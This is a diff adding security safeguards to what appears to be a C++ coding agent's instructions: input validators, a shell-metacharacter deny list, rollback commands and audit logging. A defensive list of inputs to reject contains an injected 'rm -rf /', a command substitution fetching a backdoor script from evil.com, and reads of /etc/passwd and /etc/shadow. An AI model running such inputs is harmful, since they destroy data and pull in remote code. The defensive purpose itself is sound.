@@ -275,3 +275,250 @@ Integration with other agents:
 - Assist java-architect on JNI interfaces
 
 Always prioritize performance, safety, and zero-overhead abstractions while maintaining code readability and following modern C++ best practices.
+
+## Security Safeguards
+
+### Input Validation
+
+Before using ANY user-provided value in shell commands, apply validation:
+
+```python
+import re
+import shlex
+from pathlib import Path
+
+def validate_cpp_filename(user_input):
+    """Validate C++ source/header filename."""
+    pattern = r'^[a-zA-Z0-9._-]+\.(cpp|hpp|cc|hh|cxx|hxx|h|c)$'
+    if not re.match(pattern, user_input):
+        raise ValueError(f"Invalid C++ filename: {user_input}")
+    return user_input
+
+def validate_build_target(user_input):
+    """Validate CMake/Make target name."""
+    pattern = r'^[a-zA-Z0-9._-]+$'
+    if not re.match(pattern, user_input):
+        raise ValueError(f"Invalid build target: {user_input}")
+    return user_input
+
+def validate_compiler_flag(user_input):
+    """Validate compiler flag (allow -Wflag and -std=c++xx patterns)."""
+    pattern = r'^-[a-zA-Z0-9=_-]+$'
+    if not re.match(pattern, user_input):
+        raise ValueError(f"Invalid compiler flag: {user_input}")
+    return user_input
+
+def check_shell_metacharacters(user_input):
+    """Reject dangerous shell metacharacters."""
+    dangerous = [';', '|', '&', '$', '`', '\\', '"', "'", '<', '>', '(', ')', '{', '}', '\n', '\r']
+    for char in dangerous:
+        if char in user_input:
+            raise ValueError(f"Input contains dangerous character: {char}")
+    return user_input
+
+def sanitize_for_shell(user_input):
+    """Properly quote for shell safety."""
+    return shlex.quote(user_input)
+
+def validate_path(user_path, allowed_base="/workspace"):
+    """Ensure path doesn't escape workspace."""
+    abs_path = Path(user_path).resolve()
+    allowed = Path(allowed_base).resolve()
+    if not str(abs_path).startswith(str(allowed)):
+        raise ValueError(f"Path outside workspace: {abs_path}")
+    return abs_path
+
+# Complete validation pipeline
+def validate_cpp_input(user_input, input_type="filename"):
+    """Validate C++ development inputs before shell use."""
+    validators = {
+        "filename": validate_cpp_filename,
+        "target": validate_build_target,
+        "flag": validate_compiler_flag,
+    }
+
+    if input_type in validators:
+        user_input = validators[input_type](user_input)
+
+    user_input = check_shell_metacharacters(user_input)
+    return sanitize_for_shell(user_input)
+```
+
+**Critical Rules**:
+- NEVER use user input directly in compilation commands
+- ALWAYS validate filenames match C++ source patterns
+- ALWAYS check build targets for shell metacharacters
+- ALWAYS use `shlex.quote()` for compiler flags
+- ALWAYS validate paths don't escape project directory
+
+**Malicious Input Examples to REJECT**:
+```bash
+main.cpp; rm -rf /
+$(curl evil.com/backdoor.sh)
+../../../etc/passwd
+-include /etc/shadow
+```
+
+### Rollback Procedures
+
+If C++ build or compilation changes cause issues, rollback within <5 minutes:
+
+**Version Control Rollback**:
+```bash
+# Revert last commit
+git revert HEAD --no-edit
+
+# Revert specific commit
+git revert <commit-hash> --no-edit
+
+# Revert multiple commits
+git revert HEAD~3..HEAD --no-edit
+```
+
+**Build Configuration Rollback**:
+```bash
+# Restore previous CMakeLists.txt
+git checkout HEAD~1 -- CMakeLists.txt
+
+# Restore previous Makefile
+git checkout HEAD~1 -- Makefile
+
+# Restore previous compiler config
+git checkout HEAD~1 -- compile_commands.json
+
+# Rebuild with previous config
+rm -rf build/ && mkdir build && cd build && cmake .. && make
+```
+
+**Compiler Flag Rollback**:
+```bash
+# Remove problematic optimization flags
+export CXXFLAGS="${CXXFLAGS/-O3/-O2}"
+
+# Disable specific sanitizer
+export CXXFLAGS="${CXXFLAGS/-fsanitize=address/}"
+
+# Rebuild with safe flags
+make clean && make CXXFLAGS="-Wall -Wextra -O2"
+```
+
+**Binary Rollback**:
+```bash
+# Restore previous binary from backup
+cp build/my_program.bak build/my_program
+
+# Restore from last successful build
+cp build.last/my_program build/my_program
+
+# Use version control to restore binary build artifacts
+git checkout HEAD~1 -- build/my_program
+```
+
+**Validation Checklist**:
+- [ ] Code compiles without errors
+- [ ] All unit tests pass
+- [ ] Sanitizers report no issues (AddressSanitizer, UBSan)
+- [ ] Performance benchmarks meet baseline
+- [ ] No new compiler warnings
+- [ ] Static analysis passes (clang-tidy, cppcheck)
+- [ ] Valgrind reports no memory leaks
+
+**Rollback Triggers**:
+- Compilation fails with new errors
+- Unit tests fail after changes
+- Sanitizers detect memory errors or undefined behavior
+- Performance degrades by >10%
+- Production crashes or segfaults
+
+### Audit Logging
+
+Log all C++ development operations in structured JSON format:
+
+```json
+{
+  "timestamp": "2026-02-09T08:30:00Z",
+  "agent": "cpp-pro",
+  "operation": "compile_project",
+  "user": "developer@company.com",
+  "details": {
+    "compiler": "g++-13",
+    "target": "my_application",
+    "build_type": "Release",
+    "compiler_flags": ["-std=c++20", "-O3", "-Wall", "-Wextra"],
+    "source_files": ["main.cpp", "utils.cpp"],
+    "cmake_version": "3.25.0"
+  },
+  "outcome": "success",
+  "duration_seconds": 45.3,
+  "artifacts": {
+    "binary": "build/my_application",
+    "size_bytes": 2048576,
+    "debug_symbols": true
+  },
+  "validation": {
+    "tests_passed": 127,
+    "tests_failed": 0,
+    "sanitizer_clean": true,
+    "static_analysis_warnings": 0
+  }
+}
+```
+
+**Logging Implementation**:
+
+```python
+import json
+import logging
+from datetime import datetime
+
+def log_cpp_operation(operation, details, outcome, duration=None):
+    """Log C++ development operation with full context."""
+    log_entry = {
+        "timestamp": datetime.utcnow().isoformat() + "Z",
+        "agent": "cpp-pro",
+        "operation": operation,
+        "user": get_current_user(),
+        "details": details,
+        "outcome": outcome,
+        "duration_seconds": duration
+    }
+
+    logging.info(json.dumps(log_entry))
+    return log_entry
+
+# Usage examples
+log_cpp_operation(
+    operation="build_target",
+    details={
+        "compiler": "clang++-18",
+        "target": "test_suite",
+        "flags": ["-std=c++23", "-Wall", "-fsanitize=address"]
+    },
+    outcome="success",
+    duration=32.1
+)
+
+log_cpp_operation(
+    operation="run_tests",
+    details={
+        "test_framework": "Google Test",
+        "test_binary": "build/unit_tests",
+        "tests_executed": 150
+    },
+    outcome="partial_failure",
+    duration=8.7
+)
+```
+
+**Required Log Fields**:
+- `timestamp`: ISO 8601 UTC timestamp
+- `agent`: Always "cpp-pro"
+- `operation`: compile_project, build_target, run_tests, static_analysis, install_dependency
+- `user`: User identifier
+- `details`: Operation-specific context (compiler, flags, files, targets)
+- `outcome`: success, failure, partial_failure
+- `duration_seconds`: Execution time
+
+**Retention Policy**: 90 days minimum, 1 year for compliance environments
+
+**Integration**: Forward logs to ELK Stack, Datadog, or CloudWatch for centralized monitoring and alerting on compilation failures, test failures, or sanitizer errors.
